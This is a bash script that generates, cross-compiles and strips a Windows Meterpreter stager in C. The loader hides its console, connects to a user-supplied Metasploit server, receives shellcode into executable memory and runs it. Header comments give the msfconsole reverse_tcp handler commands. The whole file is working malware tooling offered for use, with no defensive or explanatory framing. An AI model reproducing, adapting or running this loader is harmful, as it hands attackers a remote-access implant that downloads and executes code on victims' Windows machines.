#!/bin/bash

# Custom windows/meterpreter/reverse_tcp
# msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 10.10.IP;set LPORT 9999;exploit"
# msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 10.10.IP;set LPORT 9999;exploit"

clear
echo "****************************************************************"
echo " Automatic C source code generator - FOR METASPLOIT "
echo " Based on rsmudge metasploit-loader "
echo " PE32+ executable (GUI) x86-64 "
echo "****************************************************************"
echo -en 'Metasploit server IP : '
read ip
echo -en 'Metasploit port number : '
read port

echo '#include <stdio.h>'> win_meterpreter_loader.c
echo '#include <stdlib.h>' >> win_meterpreter_loader.c
echo '#include <winsock2.h>' >> win_meterpreter_loader.c
echo '#include <windows.h>' >> win_meterpreter_loader.c
echo -n 'unsigned char server[]="' >> win_meterpreter_loader.c
echo -n $ip >> win_meterpreter_loader.c
echo -n '";' >> win_meterpreter_loader.c
echo '' >> win_meterpreter_loader.c
echo -n 'unsigned char serverp[]="' >> win_meterpreter_loader.c
echo -n $port >> win_meterpreter_loader.c
echo -n '";' >> win_meterpreter_loader.c
echo '' >> win_meterpreter_loader.c
echo 'void winsock_init() {' >> win_meterpreter_loader.c
echo ' WSADATA wsaData;' >> win_meterpreter_loader.c
echo ' WORD wVersionRequested;' >> win_meterpreter_loader.c
echo ' wVersionRequested = MAKEWORD(2, 2);'>> win_meterpreter_loader.c
echo ' if (WSAStartup(wVersionRequested, &wsaData) < 0) {' >> win_meterpreter_loader.c
echo ' printf("bad\n"); '>> win_meterpreter_loader.c
echo ' WSACleanup(); '>> win_meterpreter_loader.c
echo ' exit(1);'>> win_meterpreter_loader.c
echo ' }' >> win_meterpreter_loader.c
echo ' }' >> win_meterpreter_loader.c
echo ' void punt(SOCKET my_socket, char * error) {' >> win_meterpreter_loader.c
echo ' printf("r %s\n", error);'>> win_meterpreter_loader.c
echo ' closesocket(my_socket);'>> win_meterpreter_loader.c
echo ' WSACleanup();'>> win_meterpreter_loader.c
echo ' exit(1);' >> win_meterpreter_loader.c
echo ' }' >> win_meterpreter_loader.c
echo ' int recv_all(SOCKET my_socket, void * buffer, int len) {' >> win_meterpreter_loader.c
echo ' int tret = 0;'>> win_meterpreter_loader.c
echo ' int nret = 0;'>>win_meterpreter_loader.c
echo ' void * startb = buffer;'>> win_meterpreter_loader.c
echo ' while (tret < len) {'>>win_meterpreter_loader.c
echo ' nret = recv(my_socket, (char *)startb, len - tret, 0);'>> win_meterpreter_loader.c
echo ' startb += nret;'>> win_meterpreter_loader.c
echo ' tret += nret;'>>win_meterpreter_loader.c
echo ' if (nret == SOCKET_ERROR)'>> win_meterpreter_loader.c
echo ' punt(my_socket, "no data");'>> win_meterpreter_loader.c
echo ' }'>>win_meterpreter_loader.c
echo ' return tret;'>> win_meterpreter_loader.c
echo '}' >> win_meterpreter_loader.c
echo 'SOCKET wsconnect(char * targetip, int port) {'>> win_meterpreter_loader.c
echo ' struct hostent * target;' >> win_meterpreter_loader.c
echo ' struct sockaddr_in sock;' >> win_meterpreter_loader.c
echo ' SOCKET my_socket;'>>win_meterpreter_loader.c
echo ' my_socket = socket(AF_INET, SOCK_STREAM, 0);'>> win_meterpreter_loader.c
echo ' if (my_socket == INVALID_SOCKET)'>> win_meterpreter_loader.c
echo ' punt(my_socket, ".");'>>win_meterpreter_loader.c
echo ' target = gethostbyname(targetip);'>>win_meterpreter_loader.c
echo ' if (target == NULL)'>>win_meterpreter_loader.c
echo ' punt(my_socket, "..");'>>win_meterpreter_loader.c
echo ' memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);'>>win_meterpreter_loader.c
echo ' sock.sin_family = AF_INET;'>> win_meterpreter_loader.c
echo ' sock.sin_port = htons(port);'>>win_meterpreter_loader.c
echo ' if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )'>>win_meterpreter_loader.c
echo ' punt(my_socket, "...");'>>win_meterpreter_loader.c
echo ' return my_socket;'>>win_meterpreter_loader.c
echo '}' >> win_meterpreter_loader.c
echo 'int main(int argc, char * argv[]) {' >> win_meterpreter_loader.c
echo ' FreeConsole();'>>win_meterpreter_loader.c
echo ' Sleep(10);'>>win_meterpreter_loader.c
echo ' ULONG32 size;'>>win_meterpreter_loader.c
echo ' char * buffer;'>>win_meterpreter_loader.c
echo ' void (*function)();'>>win_meterpreter_loader.c
echo ' winsock_init();'>> win_meterpreter_loader.c
echo ' SOCKET my_socket = wsconnect(server, atoi(serverp));'>>win_meterpreter_loader.c
echo ' int count = recv(my_socket, (char *)&size, 4, 0);'>>win_meterpreter_loader.c
echo ' if (count != 4 || size <= 0)'>>win_meterpreter_loader.c
echo ' punt(my_socket, "error lenght\n");'>>win_meterpreter_loader.c
echo ' buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);'>>win_meterpreter_loader.c
echo ' if (buffer == NULL)'>>win_meterpreter_loader.c
echo ' punt(my_socket, "error in buf\n");'>>win_meterpreter_loader.c
echo ' buffer[0] = 0xBF;'>>win_meterpreter_loader.c
echo ' memcpy(buffer + 1, &my_socket, 4);'>>win_meterpreter_loader.c
echo ' count = recv_all(my_socket, buffer + 5, size);'>>win_meterpreter_loader.c
echo ' function = (void (*)())buffer;'>>win_meterpreter_loader.c
echo ' function();'>>win_meterpreter_loader.c
echo ' return 0;'>>win_meterpreter_loader.c
echo '}' >> win_meterpreter_loader.c
echo '(+) Compiling binary ..'
i686-w64-mingw32-gcc win_meterpreter_loader.c -o win_meterpreter_loader.exe -lws2_32 -mwindows
x86_64-w64-mingw32-gcc win_meterpreter_loader.c -o win_meterpreter_loader_x64.exe -lws2_32 -mwindows
ls -la win_meterpreter_loader.c
strip win_meterpreter_loader.exe
strip win_meterpreter_loader_x64.exe
echo '(+)' `file win_meterpreter_loader.exe`
echo '(+)' `file win_meterpreter_loader_x64.exe`